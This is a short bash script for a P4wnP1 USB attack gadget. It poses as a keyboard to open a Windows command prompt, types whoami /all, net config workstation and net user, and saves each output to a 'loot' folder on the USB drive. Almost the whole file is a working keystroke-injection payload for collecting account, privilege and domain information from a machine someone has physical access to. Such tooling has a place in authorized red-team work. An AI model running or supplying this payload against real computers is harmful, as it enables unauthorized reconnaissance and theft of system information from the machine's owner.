#!/bin/bash

### Description: Enumerates domain/workgroup info and saves output to USB
### Requirements: USB gadget with HID + Mass Storage

USB_DRIVE="E:"

echo "[+] Injecting domain/workgroup enumeration via HID..."

/opt/p4wnp1/tools/hid_injector inject "GUI r"
sleep 1
/opt/p4wnp1/tools/hid_injector type "cmd.exe"
/opt/p4wnp1/tools/hid_injector inject "ENTER"
sleep 1

/opt/p4wnp1/tools/hid_injector type "whoami /all > \"$USB_DRIVE\\loot\\whoami.txt\""
/opt/p4wnp1/tools/hid_injector inject "ENTER"
sleep 1
/opt/p4wnp1/tools/hid_injector type "net config workstation > \"$USB_DRIVE\\loot\\net_config.txt\""
/opt/p4wnp1/tools/hid_injector inject "ENTER"
sleep 1
/opt/p4wnp1/tools/hid_injector type "net user > \"$USB_DRIVE\\loot\\users.txt\""
/opt/p4wnp1/tools/hid_injector inject "ENTER"
sleep 1

/opt/p4wnp1/tools/hid_injector type "exit"
/opt/p4wnp1/tools/hid_injector inject "ENTER"

echo "[+] Domain info saved to USB."

exit 0
